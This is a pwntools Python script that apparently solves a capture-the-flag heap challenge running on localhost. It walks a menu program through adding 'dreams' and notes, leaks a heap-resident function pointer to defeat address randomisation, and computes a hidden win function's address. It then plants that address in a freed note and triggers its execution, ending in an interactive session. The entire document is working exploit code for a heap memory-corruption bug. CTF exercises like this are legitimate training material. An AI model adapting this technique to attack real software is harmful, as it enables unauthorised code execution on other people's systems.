from pwn import *

context.binary = elf = ELF("./challenge")
# p = process("./challenge")
p = remote("localhost", 1234)

# step 1: leak ELF address
# step 1a: we leave some function pointer addresses on the heap
p.sendlineafter(b"> ", b"2") # dream!
p.sendlineafter(b"> ", b"1") # add a dream
p.sendlineafter(b"have? ", b"10") # 1 dream
p.sendlineafter(b"> ", b"1") # dream about valorant
for i in range(9):
    p.sendlineafter(b"> ", b"1") # add a dream
    p.sendlineafter(b"> ", b"1") # dream about valorant
p.sendlineafter(b"> ", b"2") # start dreaming

# step 1b: we leak the function pointer address from the heap
p.sendlineafter(b"> ", b"3") # go back
p.sendlineafter(b"> ", b"1") # listen to class
p.sendlineafter(b"> ", b"1") # take down a note
p.sendlineafter(b"size: ", str(8*10).encode()) # take down a note
p.sendafter(b"content: ", b"x"*24) # take down a note
p.sendlineafter(b"> ", b"3") # read a note
p.sendlineafter(b"read: ", b"0") # read a note
win = unpack(p.recvline()[33:-1], "all") + elf.sym.dream_about_flag_real - elf.sym.dream_about_valorant

# step 2: we place the win function address on the heap and trick the program to executing it
# step 2a: we place the win function address on the heap via a note
p.sendlineafter(b"> ", b"1") # take down a note
p.sendlineafter(b"size: ", str(8*4).encode()) # note size
p.sendafter(b"content: ", b"x"*24 + p64(win)) # note content
p.sendlineafter(b"> ", b"2") # delete note
p.sendlineafter(b"remove: ", b"1") # index of note
p.sendlineafter(b"> ", b"4") # delete note

# step 2b: we execute the function
p.sendlineafter(b"> ", b"2") # dream!
p.sendlineafter(b"> ", b"1") # add a dream
p.sendlineafter(b"have? ", b"4") # 1 dream
p.sendlineafter(b"> ", b"1") # dream about valorant
for i in range(2):
    p.sendlineafter(b"> ", b"1") # add a dream
    p.sendlineafter(b"> ", b"1") # dream about valorant
p.sendlineafter(b"> ", b"2") # start dreaming


p.interactive()
